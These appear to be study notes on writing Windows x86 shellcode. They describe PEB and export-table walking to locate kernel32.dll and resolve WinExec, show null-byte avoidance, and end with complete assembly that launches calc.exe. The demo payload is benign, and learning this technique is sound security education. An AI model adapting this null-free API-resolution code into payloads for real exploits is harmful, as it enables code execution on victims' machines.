PEB:
typedef struct _PEB {
  BYTE                            Reserved1[2];
  BYTE                            BeingDebugged;
  BYTE                            Reserved2[1];
  PVOID                           Reserved3[2];
  PPEB_LDR_DATA                   Ldr;
  PRTL_USER_PROCESS_PARAMETERS    ProcessParameters;
  BYTE                            Reserved4[104];
  PVOID                           Reserved5[52];
  PPS_POST_PROCESS_INIT_ROUTINE   PostProcessInitRoutine;
  BYTE                            Reserved6[128];
  PVOID                           Reserved7[1];
  ULONG                           SessionId;
} PEB, *PPEB;


PEB address is in TEB,  0x30 bytes from the start.
TEB is in FS seg register.

PEB + 0xC -> PEB_LDR_DATA     contains info about loaded DLLs, double linked list.
PEB_LDR_DATA + 0x14  -> list named InMemoryOrderModuleList, ptr to first DLL loaded in memory.

Windows XP (all service packs), ntdll.dll and kernel32.dll are in the 2nd and 3rd entries.  

mov ebx, fs:0x30            ; pointer to PEB
mov ebx, [ebx + 0x0C]       ; pointer to PEB_LDR_DATA
mov ebx, [ebx + 0x14]       ; pointer to first entry in InMemoryOrderModuleList
mov ebx, [ebx]              ; pointer to second (ntdll.dll) entry 
mov ebx, [ebx]              ; point to third (kernel32.dll) entry
mov ebx, [ebx + 0x10]       ; Get kernel32.dll base address

rewriting to remove nulls for shellcode..

xor esi, esi
mov ebx, [fs:30h + esi]     ; avoids nulls
mov ebx, [ebx + 0x0C]
mov ebx, [ebx + 0x14]
mov ebx, [ebx]
mov ebx, [ebx]
mov ebx, [ebx + 0x10]           ; ebx holds kernel32.dll base address


PE format offsets:

RVA 0x78 - Export Table
Export Table + 0x14  -> number of functions that the DLL exports
Export Table + 0x1C  -> Address table, holds all the addresses of the exported functions
Export Table + 0x20  -> Name Pointer Table,  pointers to the names of export functions
Export Table + 0x24  -> Ordinal Table,  positions of functions in Address Table


Put All together:
base address + 0x3c -> RVA 
base address + RVA -> PE signature
PE signature + 0x78 -> RVA of export table
base address + RVA of export table -> address of export table
Export table + 0x1c -> RVA of Address table
base address + RVA of address table -> address of Address table
Export Table + 0x20 -> RVA of name pointer table
base address + rva of name pointer table -> address of name pointer table
Export table + 0x24 -> RVA of ordinal table
base address + RVA of ordinal table -> address of ordinal table
Loop on the name pointer table and compare each entry to the string we are looking for, storing index in the table.
Once found, find index of the function in the ordinal table -> Address of Ordinal + (index*2)
  Each record in the table is 2 bytes in size, hence the index*2.
Using ordinal number, go to address table to -> address table + (ordinal number * 4)
  Each ordinal table entry is 4 bytes in size, hence the number*4
Using that RVA, we can find the function address by adding the RVA to DLL's base address.

[BITS 32]

start:
    push eax                        ; store relevant registers
    push ebx
    push ecx
    push edx
    push esi
    push edi
    push ebp
    
    push ebp                        ; new stack frame
    mov ebp, esp
    sub esp, 18h                    ; local vars space on stack
    
    xor esi, esi
    mov esi, 0x01646679
    sub esi, 0x01010101
    push esi
    push 456e6957h
    mov [ebp - 4], esp                ; store function name "WinExec\x00"
    
    ; get kernel32.dll base address
    xor esi, esi
    mov ebx, [fs:30h + esi]         ; avoids nulls
    mov ebx, [ebx + 0x0C]
    mov ebx, [ebx + 0x14]
    mov ebx, [ebx]
    mov ebx, [ebx]
    mov ebx, [ebx + 0x10]           ; ebx holds kernel32.dll base address
    mov [ebp - 8], ebx              ; store kernel32.dll base address
    
    mov eax, [ebx + 3ch]            ; base address + 0x3c -> RVA 
    add eax, ebx                        ; base address + RVA -> PE signature
    mov eax, [eax + 78h]                ; PE signature + 0x78 -> RVA of export table
    add eax, ebx                        ; base address + RVA of export table -> address of export table
    mov ecx, [eax + 24h]                ; export table + 0x24 -> RVA of ordinal table
    add ecx, ebx                        ; base address + RVA of ordinal table -> address of ordinal table
    mov [ebp-0Ch], ecx                  ; store addr of ordinal table
    mov edi, [eax + 20h]                ; export table + 0x20 -> RVA of name pointer table
    add edi, ebx                        ; base address + RVA of name pointer table -> address of name pointer table
    mov [ebp-10h], edi                  ; store addr of name pointer table
    mov edx, [eax + 1Ch]                ; export table + 0x1c -> RVA of address table
    add edx, ebx                        ; base address + RVA of address table -> address of address table
    mov [ebp-14h], edx                  ; store addr of address table
    mov edx, [eax + 14h]                ; Export Table + 0x14  -> number of functions that the DLL exports
    xor eax, eax                        ; counter = 0

.loop:
    mov edi, [ebp - 10h]            ; address of name pointer table
    mov esi, [ebp - 4h]             ; string of function name to search for ("WinExec\x00")
    xor ecx, ecx
    
    cld                             ; set DF=0 => process strings from left to right
    mov edi, [edi + eax*4]          ; name pointer table entries are 4 bytes
    
    add edi, ebx                    ; base address + RVA nth entry -> address of string
    add cx, 8                       ; length of strings to compare (this should be length of the string you're looking for)
    repe cmpsb
                                    ; compares esi and edi.  ZF=1 if equal, ZF=0 if not
    jz start.found
    
    inc eax
    cmp eax, edx                    ; edx = num of functions exported.. check if we've reached the end
    jb start.loop
    
    add esp, 26h
    jmp start.end                   ; function not found

.found:
    ; eax holds position of our string..
    mov ecx, [ebp - 0Ch]            ; address of ordinal table
    mov edx, [ebp - 14h]            ; address of address table
    
    mov ax, [ecx + eax*2]           ; ordinal number
    mov eax, [edx + eax*4]          ; RVA of function
    add eax, ebx                    ; address of function = kernel32.dll base address + RVA of function
    
xor edx, edx
push edx
push 6578652eh                      ; push exe.
push 636c6163h                      ; push clac
push 5c32336dh                      ; push \23m
push 65747379h                      ; push etsy
push 535c7377h                      ; push S\sw
push 6f646e69h                      ; push odni
push 575c3a43h                      ; push W\:C
mov esi, esp                        ; esi -> "C:\Windows\System32\calc.exe"

push 10                             ; window state SW_SHOWDEFAULT
push esi
call eax

add esp, 46h                        ; clear the stack

.end:
    pop ebp
    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx
    pop eax
    ret
